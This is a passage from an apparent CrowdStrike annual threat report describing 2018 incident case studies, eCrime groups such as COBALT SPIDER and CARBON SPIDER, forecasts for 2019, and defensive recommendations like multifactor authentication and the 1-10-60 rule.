third-party portal as part of an attack. Clearly, it was confident in its
ability to intercept communications between the third-party portal and
employees with legitimate accounts.
CrowdStrike Services discovered that the survey page used as bait had
been hosted on an unmonitored website operated by a small library
located in the United States. The code was buried deep on the web
server, but when attempts were made to retrieve the files to find more
evidence, it was too late: The library had found the page first and wiped
the file.
CrowdStrike, with the permission of the customer, conveyed essential
details of the case to U.S. federal law enforcement. Using these details
and information about other CrowdStrike cases involving the same
adversary, federal law enforcement was able to arrest the group that
was using this particular set of TTPs.

COBALT SPIDER’S USE OF BUILDER KITS
COBALT SPIDER was
a repeat customer
of kit developers,
with demonstrated
use of ThreadKit and
VenomKit.

Exploit document builder kits proved to be very popular in 2018, due in
large part to their ease of integration with secondary payloads, and regular
releases of new versions containing exploits for the latest Microsoft Office,
Internet Explorer and Adobe Flash vulnerabilities. COBALT SPIDER was
a repeat customer of kit developers, with demonstrated use of ThreadKit
and VenomKit. In May and June 2018, CrowdStrike Intelligence identified
COBALT SPIDER malicious RTF documents created via ThreadKit, however,
the adversary moved to using VenomKit over the course of the summer.
While COBALT SPIDER was not their only customer, the loss of its business
to competitors may have affected the profits of both ThreadKit and
VenomKit. CrowdStrike Intelligence observed regular iterations of ThreadKit
from April 2017 until September 2018, after which no further development
was identified until very late December 2018 when exploit code for CVE
2018-15982 was added. Similarly, after a drop in price in November 2018,
the vendor of VenomKit announced in December that the kit was no longer
for sale. Taurus loader documents, on the other hand, continue to be
observed, and CrowdStrike Intelligence expects to see this tool in use in the
near-term, at least into early 2019.
In December 2018, CrowdStrike Intelligence identified evidence that
COBALT SPIDER was once again changing its toolset. Malicious
documents, tracked as Aries by CrowdStrike, were distributed using
hyperlinks embedded within spear-phishing emails targeting Eastern
European and Panamanian financial institutions.

CARBON SPIDER MONETIZATION THROUGH JOKER’S STASH
CrowdStrike Intelligence
has tracked Joker’s
Stash since late 2014.
This entity advertises
and sells millions of card
records, often for less
than $10 USD each.

Throughout 2018, CrowdStrike Intelligence observed several large credit
card data dumps being sold on criminal marketplaces. One of the most
prominent “carding shops” was Joker’s Stash. In May 2018, CrowdStrike
Intelligence confirmed that credit card data obtained in CARBON SPIDER
intrusions was monetized via the Joker’s Stash carding operation. The theft
of this specific dataset was enabled by the adversary’s custom malware,
Bateleur. The targeting of PoS terminals and additional TTPs observed
in the incident are also consistent with CARBON SPIDER. CrowdStrike
Intelligence has noted an extended time gap between data exfiltration and
the advertising of the stolen data via Joker’s Stash. The consistency of this
trend suggests that CARBON SPIDER may be using the data themselves
first, or that there is an extended resale chain prior to advertising through
Joker’s Stash.
CrowdStrike Intelligence has tracked Joker’s Stash since late 2014. This
entity advertises and sells millions of card records, often for less than $10
USD each. The operators of Joker’s Stash advertise on several Russianlanguage underground forums and are not fluent English speakers, so it is
possible that the operators of Joker’s Stash are of Russian origin. Joker’s
Stash is also known for its operational and communications security
practices, which eschew frequent underground communication tools such
as Jabber and ICQ.

A Clean Laptop Left, a Dirty Laptop Came
Back — An Interesting Drive-By Technique8
Situational Analysis
An employee used a laptop in a public space to access a third-party
partner site. The laptop had traditional antivirus software installed. That
site was compromised with FakeUpdates, a campaign affecting thousands
of Joomla and WordPress sites, which ultimately led to a Dridex malware
infection and PowerShell Empire installation on the laptop. When the
employee returned to work, the infected laptop served as the entry point
for the adversary to compromise the corporate network.

Investigation and Analysis
CrowdStrike Services began its analysis by first deploying the Falcon
platform throughout the environment to gain real-time protection and
visibility on the endpoints, and then using Falcon Forensics Collector,
a tool created by CrowdStrike, to collect historical information from
endpoints in order to quickly triage and scope incidents. Real-time
data, in conjunction with artifacts the adversary had left on the system,
were used to understand what had occurred, identify key systems and
pinpoint compromised users.
The CrowdStrike investigation included forensic hard-drive analysis
of three systems and historical artifact collection from a few
thousand additional endpoints. The investigation also identified a
misconfiguration in Active Directory that placed all domain users in the
local administrators’ group for systems within the European Union. This
misconfiguration alone did not allow for the attack to succeed, but it
certainly helped the adversary compromise the environment quickly
and completely.

ADVERSARY TRADECRAFT AND THE IMPORTANCE OF SPEED

74

In 2019, targeted intrusion adversaries will continue to conduct campaigns
as part of their nation-state’s national strategies. China, Russia, Iran, and the
DPRK are seeking geopolitical prominence, both in their respective regions
and internationally, and they will use their cyber capabilities to attain and
maintain situational awareness of their neighbors and rivals. Entities in the
government, defense, think tank and NGO sectors will continue to be the
targets of these operations. These intrusions will likely be supported by the
targeting of upstream providers in the telecommunications and technology
(particularly managed service providers) sectors, and may include supply
chain compromises, as was observed in 2017.

Although mineware may
no longer be a rising
trend, it is still likely to
affect organizations
across all sectors and
may be observed in
conjunction with other
crimeware.

For China, interest in regional neighbors will likely support the BRI and
Digital Silk Road initiatives, the latter furthering the balkanization of the
internet. Vietnam and Thailand have already drafted intrusive cybersecurity
laws that closely resemble China’s. The spread of such surveillance
standards will undoubtedly benefit Chinese adversary groups, many of
which are well-versed in targeting telecom organizations. Russia and Iran
are also likely to make efforts to control the direction of international policy
regarding internet use. Both countries continue to pursue efforts to control
content on domestic internet platforms. Actors and organizations in Iran
and Russia are also likely to continue using information operations (IO)
campaigns to support narratives favorable to these countries, regardless of
the vigilance of social media companies.
It remains too early to tell if BOSS SPIDER will return to operations following
the DoJ indictment. In the meantime, it is highly likely that other Big Game
Hunting adversaries — INDRIK SPIDER and GRIM SPIDER — will continue
to operate to their fullest capacity, undeterred by potential law enforcement
activity. CrowdStrike Intelligence continues to observe fluctuations in the
eCrime ecosystem; however, it is clear that reputation remains a driving
factor among eCrime adversaries. GURU SPIDER’s ruined status is a notable
example of how quickly a downfall can occur, while MUMMY SPIDER has
leveraged its relationships to grow into a formidable force.
Although mineware may no longer be a rising trend, it is still likely to affect
organizations across all sectors and may be observed in conjunction with
other crimeware. BEC will remain elevated in 2019, as new actor groups
utilizing these tactics emerge and existing groups develop new TTPs for
compromising their victims.

RECOMMENDATIONS
2018 was another tumultuous year in cybersecurity. Looking forward,
there is ample evidence that adversaries will be forced to adapt and
deploy stealthier tactics in order to continue their profitable operations,
prolonging the cybersecurity arms race. CrowdStrike recommends that
all organizations consider the following measures to help maintain strong
defenses in 2019:

01

BASIC HYGIENE STILL MATTERS
The basics of user awareness, asset and vulnerability management, and
secure configurations continue to serve as the foundation for a strong
cybersecurity program. CrowdStrike recommends that organizations regularly
review and improve their standard security controls, including the following:
User awareness programs should be initiated to combat the continued
threat of phishing and related social engineering techniques, such as
2018’s massive Emotet outbreak.
Asset management and software inventory are crucial to ensuring that
organizations understand their own footprint and exposure.
Vulnerability and patch management can verify that known vulnerabilities
and insecure configurations are identified, prioritized and remediated.
Multifactor authentication (MFA) should be established for all users
because today’s attackers have proven to be adept at accessing and using
valid credentials, leading quickly to deeper compromise — also, MFA makes
it much more difficult for adversaries to gain privileged access.
In addition to MFA, a robust privilege access management process
will limit the damage adversaries can do if they get in, and reduce the
likelihood of lateral movement.
Implement password protection to prevent disabling or uninstalling
endpoint protection that provides critical prevention and visibility for
defenders — also, disabling it is always a high-priority for attackers
looking to deepen their foothold and hide their activities.

LOOK BEYOND MALWARE:
STRENGTHEN DEFENSES AGAINST MODERN ATTACKS

03

SURVIVAL OF THE FASTEST :
ACCEPT THE 1-10-60 CHALLENGE

As sophisticated attacks continue to evolve, enterprises face much more
than just “a malware problem.” Defenders must look for early warning signs
that an attack may be underway, such as code execution, persistence,
stealth, command control and lateral movement within a network.
Contextual and behavioral analysis, when delivered in real time via machine
learning and artificial intelligence, effectively detects and prevents attacks
that conventional “defense-in-depth” technologies cannot address.

With breakout time measured in hours, CrowdStrike recommends that
organizations pursue the “1-10-60 rule” in order to effectively combat
sophisticated cyberthreats:
Detect intrusions in under one minute,
Perform a full investigation in under 10 minutes
Eradicate the adversary from the environment in under 60 minutes
Organizations that meet this 1-10-60 benchmark are much more likely to
eradicate the adversary before the attack spreads out from its initial entry
point, minimizing impact and further escalation. Meeting this challenge
requires investment in deep visibility, as well as automated analysis and
remediation tools across the enterprise, reducing friction and enabling
responders to understand threats and take fast, decisive action.

04

LOOK FOR PARTNERS TO HELP FILL THE TALENT GAP
It is tempting for organizations to turn primarily to technology to solve
their cybersecurity challenges. Events from 2018 remind us that behind
every attack, there is a human adversary who is adept at changing TTPs in
response to technical controls. Defending against these threats ultimately
requires effective, dedicated and capable security professionals. The most
talented professionals are hard to find, and expensive to keep on staff.
Successful enterprises often look outward for help, partnering with bestin-class external solution providers to help fill critical talent gaps in a costeffective manner.
